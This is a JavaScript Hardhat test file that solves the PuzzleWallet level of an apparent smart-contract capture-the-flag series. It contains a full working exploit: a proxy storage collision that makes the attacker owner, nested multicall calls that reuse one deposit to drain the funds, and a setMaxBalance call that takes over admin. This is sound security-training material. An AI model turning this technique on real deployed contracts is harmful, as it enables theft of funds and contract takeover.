const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("24-PuzzleWallet", async function () {
    let deployer, attacker, instance, wallet, proxy
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["24"])
        const contract = await ethers.getContract("PuzzleProxy")
        instance = contract.address
        wallet = await ethers.getContractAt("PuzzleWallet", instance, attacker)
        proxy = await ethers.getContractAt("PuzzleProxy", instance, attacker)

        // fund contract with 0.001 ether
        await wallet.connect(deployer).addToWhitelist(deployer.address)
        await wallet.connect(deployer).deposit({ value: ethers.utils.parseEther("0.001") })

        // check contract is set up properly
        assert.equal(
            (await ethers.provider.getBalance(instance)).toString(),
            ethers.utils.parseEther("0.001")
        )
        assert.equal(await proxy.admin(), deployer.address)
        assert.equal(await wallet.owner(), deployer.address)
        assert.notEqual((await wallet.maxBalance()).toString(), "0")
    })
    it("should set admin to attacker", async function () {
        // become owner
        await proxy.proposeNewAdmin(attacker.address)

        // whitelist self
        await wallet.addToWhitelist(attacker.address)

        // use multicall to deposit once but increase balances[attacker] twice
        const depositSignature = wallet.interface.encodeFunctionData("deposit")
        const multicallDepositSignature = wallet.interface.encodeFunctionData("multicall", [
            [depositSignature],
        ])
        await wallet.multicall([multicallDepositSignature, multicallDepositSignature], {
            value: ethers.utils.parseEther("0.001"),
        })
        assert.equal(
            (await wallet.balances(attacker.address)).toString(),
            (await ethers.provider.getBalance(instance)).toString()
        )

        // execute (withdraw)
        await wallet.execute(attacker.address, ethers.utils.parseEther("0.002"), "0x")
        assert.equal((await ethers.provider.getBalance(instance)).toString(), "0")

        // set admin to attacker using setMaxBalance
        const input = ethers.BigNumber.from(attacker.address)
        await wallet.setMaxBalance(input)
        const newAdmin = await proxy.admin()
        assert.equal(newAdmin, attacker.address)
    })
})
